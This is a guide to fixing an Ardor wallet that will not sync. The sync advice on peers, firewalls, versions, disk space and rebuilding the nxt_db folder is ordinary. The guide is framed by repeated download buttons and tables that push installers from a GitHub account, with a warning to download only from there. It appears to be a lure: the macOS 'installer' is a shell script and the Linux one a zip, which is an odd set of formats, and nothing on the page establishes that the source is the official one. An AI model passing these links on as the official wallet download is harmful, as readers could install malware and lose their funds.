![Ardor Wallet guide](assets/banner-article.png)

# Fix an Ardor wallet that will not sync

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

An Ardor wallet stops syncing when it cannot reach peers, when a firewall blocks the port it needs, or when the build is too old for the current chain. The block height is the evidence: a height that climbs slowly is working, a height frozen for an hour is not, and the fix usually starts with the connection rather than the blockchain.

## What you see

The client opens, shows a height, and then sits there. The peers count may be zero, one or several. The log may repeat a connection error, or show nothing at all. A [light client](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) can appear connected while its remote node is behind, which looks like a sync failure and is really a stale view.

Distinguish the two before doing anything: a full client that is not syncing cannot advance its own database, while a light client never had one and is waiting for answers.

## How syncing is supposed to work

A full client downloads the chain from peers, validates it and stores it locally. It needs outbound connections, a port that is reachable, and enough [disk space](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/where-ardor-stores-blockchain-data.md) for the database to grow. A light client skips all of that and asks remote nodes for the specific data it displays.

The peer count is the first signal. Zero peers means the client cannot find anyone to talk to, which is a network or firewall problem rather than a [chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) problem. One or more peers with a frozen height means the client is connected but not receiving blocks, which is usually a version or a disk problem.

## Causes and what each looks like

| Symptom | Likely cause | Where to look |
|---|---|---|
| Zero peers | Firewall, wrong port, no outbound access | The port and firewall guide |
| Peers present, height frozen | Out-of-date build, or a fork the network left behind | The release notes and the wallet version |
| Height climbs then stalls | Disk full, or the database was interrupted | Free space, then restart |
| Light client shows nothing | Remote node lagging or unreachable | Restart, or switch to full client |
| Error about Java at launch | Runtime missing or too old | The Java error guide |

A wallet that fell out of sync after an upgrade belongs in the second row. A mandatory hard fork invalidates older builds, and the only fix is the current [release](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md) rather than a setting.

## Fix it step by step

1. Read the height, wait five minutes, and read it again. If it moved, the client is working and the problem is patience or a slow connection.
2. Check the peer count. Zero peers sends you to the connection and firewall checks; a healthy count sends you to the version.
3. Confirm the wallet is the current release. An older build can be running perfectly and still be unable to follow the chain.
4. Check free disk space. A full database needs room to grow, and a full disk stops the write rather than reporting an error.
5. Restart the wallet and let it reconnect. Do not delete the database at this stage; a restart is cheap and a re-download is not.
6. If the height is still frozen with peers present and the build is current, look at the log for the first repeated error rather than the last line.

Step six is where most guides stop being useful, because the log entry names the actual failure: a refused connection, a checksum mismatch, a permission error on the data folder.

## If the height never moves

Delete and re-download the blockchain database as a last resort. That means closing the wallet, removing the `nxt_db` folder, and letting the client rebuild it from peers. It costs hours of sync time and it fixes a corrupted database, which is the one case where the local copy is the problem.

Before that, try a light client. If a light client shows the correct balance while the full client is stuck, the chain is fine and the local database is the fault, which justifies the re-download.

Give the re-download a directory of its own rather than overwriting the old one, if you have the space. A failed rebuild that replaced a working folder leaves you with nothing to compare against, and keeping both costs only disk. Once the new database reaches the current height, the old one can go.

## Prevention

Keep the build current, keep disk space free, and avoid closing the wallet while it is writing. Use a full client if you forge or if you want independence from remote nodes; use a light client if a laptop that is opened occasionally should not carry a database. Neither choice changes the account, and switching between them later is a reinstall rather than a migration.

For a node that must stay available, watch the height rather than the window. A client that is a few blocks behind is healthy; one that is thousands behind has already stopped working, and the sooner that is noticed the cheaper it is to fix. A short daily glance at the height costs nothing and catches the problem before it becomes a re-download.

## FAQ

### How long should a first sync take?

Hours, not minutes, for a chain of this age, and longer on a slow disk or connection. The height should climb steadily throughout; if it does not move at all in the first ten minutes, treat it as a connection problem.

### Why does my wallet show peers but no progress?

Connected peers with a frozen height usually means the build is too old for the current chain, or the database cannot be written. Check the version first, then disk space.

### Can I use the wallet while it syncs?

You can open it, but balances and history will be incomplete until the local database catches up. A light client avoids the wait.

### Does reinstalling delete my account?

No. The account comes from your secret. Reinstalling only affects the application and, if you remove it, the local blockchain database.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Why the Ardor wallet shows a zero balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md)
- [Ardor node ports and the firewall rules that block them](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-node-ports-and-firewall.md)
- [Ardor light client or full node: choose before you start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md)
- [Why an out-of-date Ardor node stops working](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/update-ardor-or-be-blacklisted.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
